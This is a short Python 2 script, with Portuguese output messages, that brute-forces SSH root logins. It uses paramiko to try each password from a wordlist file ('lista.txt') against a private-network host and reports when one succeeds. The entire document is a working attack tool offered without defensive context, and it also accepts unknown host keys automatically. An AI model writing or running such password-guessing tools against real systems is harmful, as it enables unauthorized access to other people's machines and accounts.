#!/bin/python

import paramiko

ssh = paramiko.SSHClient()

ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

f = open("lista.txt")

for pas in f.readlines():
    senha = pas.split()
    try:
     ssh.connect("192.168.15.112", username="root", password=senha[0])
    except paramiko.AuthenticationException:
     print "[-] - Acesso Negado",pas
    else:
     print "[+] - Senha encontrada: ",pas

ssh.close()
